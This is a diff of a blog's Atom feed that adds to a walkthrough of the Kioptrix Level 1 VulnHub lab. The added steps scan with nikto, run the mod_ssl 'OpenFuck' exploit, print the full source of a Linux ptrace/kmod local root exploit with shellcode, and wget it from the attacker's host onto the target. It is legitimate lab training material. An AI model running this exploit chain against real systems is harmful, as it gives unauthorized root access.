@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-06T15:31:50-05:00</updated>
+  <updated>2016-06-07T14:44:27-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -18,7 +18,7 @@
     <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
     <updated>2016-06-06T09:21:18-05:00</updated>
     <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
-    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
+    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
 
 <h3>Tools:</h3>
 
@@ -28,6 +28,7 @@
 <li>nbtscab</li>
 <li>enum4linux</li>
 <li>Metasploit</li>
+<li>Nikto</li>
 </ul>
 
 
@@ -86,6 +87,425 @@
 <p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>DONE SMB</p>
+
+<p>mod_ssl exploit:</p>
+
+<p>use nikto to scan:</p>
+
+<p><code>nikto -h 192.168.79.182</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like mod_ssl is vulnerable</p>
+
+<p>search exploits:</p>
+
+<p><code>searchexploit openssl</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now try to compile the c code. Get error. Find a <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">blog</a> to fix it.</p>
+
+<p>now recompile:</p>
+
+<p><code>
+gcc 764.c -o 764 -lcrypto
+</code></p>
+
+<p>run the 764 and it requires to input id for the target&rsquo;s supported box eg: 0x00. In the result of nikto, the box is Apache/1.3.20 (Unix)  (Red-Hat/Linux)</p>
+
+<p>so I can just:</p>
+
+<p><code>./764 -h |grep 1.3.20</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>so we can just 0x6a and 0x0b. Finially got 0x0b works</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I get the shell, but still not get the root. After analysis, I figure it out that code 764.c download ptrace-kmod.c. compile and execute it. I didn&rsquo;t connect my vm to Internet, so it failed when it tried to download the code. Finally I get the ptrace-kmod.c</p>
+
+<figure class='code'><figcaption><span>ptrace-kmod.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+<span class='line-number'>173</span>
+<span class='line-number'>174</span>
+<span class='line-number'>175</span>
+<span class='line-number'>176</span>
+<span class='line-number'>177</span>
+<span class='line-number'>178</span>
+<span class='line-number'>179</span>
+<span class='line-number'>180</span>
+<span class='line-number'>181</span>
+<span class='line-number'>182</span>
+<span class='line-number'>183</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
+</span><span class='line'><span class="cm"> * Linux kernel ptrace/kmod local root exploit</span>
+</span><span class='line'><span class="cm"> *</span>
+</span><span class='line'><span class="cm"> * This code exploits a race condition in kernel/kmod.c, which creates</span>
+</span><span class='line'><span class="cm"> * kernel thread in insecure manner. This bug allows to ptrace cloned</span>
+</span><span class='line'><span class="cm"> * process, allowing to take control over privileged modprobe binary.</span>
+</span><span class='line'><span class="cm"> *</span>
+</span><span class='line'><span class="cm"> * Should work under all current 2.2.x and 2.4.x kernels.</span>
+</span><span class='line'><span class="cm"> * </span>
+</span><span class='line'><span class="cm"> * I discovered this stupid bug independently on January 25, 2003, that</span>
+</span><span class='line'><span class="cm"> * is (almost) two month before it was fixed and published by Red Hat</span>
+</span><span class='line'><span class="cm"> * and others.</span>
+</span><span class='line'><span class="cm"> * </span>
+</span><span class='line'><span class="cm"> * Wojciech Purczynski &lt;cliph@isec.pl&gt;</span>
+</span><span class='line'><span class="cm"> *</span>
+</span><span class='line'><span class="cm"> * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*</span>
+</span><span class='line'><span class="cm"> * IT IS PROVIDED &quot;AS IS&quot; AND WITHOUT ANY WARRANTY</span>
+</span><span class='line'><span class="cm"> * </span>
+</span><span class='line'><span class="cm"> * (c) 2003 Copyright by iSEC Security Research</span>
+</span><span class='line'><span class="cm"> */</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;grp.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;paths.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;signal.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/wait.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/param.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/ptrace.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;linux/user.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="n">cliphcode</span><span class="p">[]</span> <span class="o">=</span>
+</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x90\x90\xeb\x1f\xb8\xb6\x00\x00</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x00\x5b\x31\xc9\x89\xca\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="s">&quot;</span><span class="se">\xb8\x0f\x00\x00\x00\xb9\xed\x0d</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x00\x00\xcd\x80\x89\xd0\x89\xd3</span><span class="s">&quot;</span>
+</span><span class='line'>  <span class="s">&quot;</span><span class="se">\x40\xcd\x80\xe8\xdc\xff\xff\xff</span><span class="s">&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define CODE_SIZE (sizeof(cliphcode) - 1)</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">pid_t</span> <span class="n">parent</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="kt">pid_t</span> <span class="n">child</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="kt">pid_t</span> <span class="n">victim</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="k">volatile</span> <span class="kt">int</span> <span class="n">gotchild</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">fatal</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">msg</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">kill</span><span class="p">(</span><span class="n">parent</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">kill</span><span class="p">(</span><span class="n">child</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">kill</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">putcode</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span> <span class="n">dst</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">MAXPATHLEN</span> <span class="o">+</span> <span class="n">CODE_SIZE</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span> <span class="n">src</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">len</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">cliphcode</span><span class="p">,</span> <span class="n">CODE_SIZE</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">len</span> <span class="o">=</span> <span class="n">readlink</span><span class="p">(</span><span class="s">&quot;/proc/self/exe&quot;</span><span class="p">,</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">CODE_SIZE</span><span class="p">,</span> <span class="n">MAXPATHLEN</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to read /proc/self/exe&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">len</span> <span class="o">+=</span> <span class="n">CODE_SIZE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">dst</span><span class="o">++</span><span class="p">,</span> <span class="o">*</span><span class="n">src</span><span class="o">++</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>          <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to write shellcode&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">sigchld</span><span class="p">(</span><span class="kt">int</span> <span class="n">signo</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">gotchild</span><span class="o">++</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Signal caught</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to read registers&quot;</span><span class="p">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Shellcode placed at 0x%08lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">eip</span><span class="p">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">putcode</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">eip</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Now wait for suid shell...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to detach from victim&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">sigalrm</span><span class="p">(</span><span class="kt">int</span> <span class="n">signo</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">errno</span> <span class="o">=</span> <span class="n">ECANCELED</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Fatal error&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">do_child</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">child</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">victim</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">signal</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">sigchld</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">do</span>
+</span><span class='line'>      <span class="n">err</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">errno</span> <span class="o">==</span> <span class="n">ESRCH</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to attach&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Attached to %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">gotchild</span><span class="p">)</span> <span class="p">;</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to setup syscall trace&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Waiting for signal</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span><span class="p">(;;);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">do_parent</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">progname</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">socket</span><span class="p">(</span><span class="n">AF_SECURITY</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">do</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">err</span> <span class="o">=</span> <span class="n">stat</span><span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">st</span><span class="p">.</span><span class="n">st_mode</span> <span class="o">&amp;</span> <span class="n">S_ISUID</span><span class="p">)</span> <span class="o">!=</span> <span class="n">S_ISUID</span><span class="p">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to stat myself&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">alarm</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">progname</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">prepare</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">initgroups</span><span class="p">(</span><span class="s">&quot;root&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">execl</span><span class="p">(</span><span class="n">_PATH_BSHELL</span><span class="p">,</span> <span class="n">_PATH_BSHELL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to spawn shell&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">prepare</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">sigalrm</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">alarm</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">parent</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">victim</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">fatal</span><span class="p">(</span><span class="s">&quot;[-] Unable to fork&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">do_child</span><span class="p">();</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>      <span class="n">do_parent</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>in target vm /tmp:</p>
+
+<p><code>wget http://192.168.79.173/ptrace-kmod.c</code></p>
+
+<p>&lsquo;gcc ptrace-kmod.c -o attack&rsquo;</p>
+
+<p>run attack:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
 ]]></content>
   </entry>
   
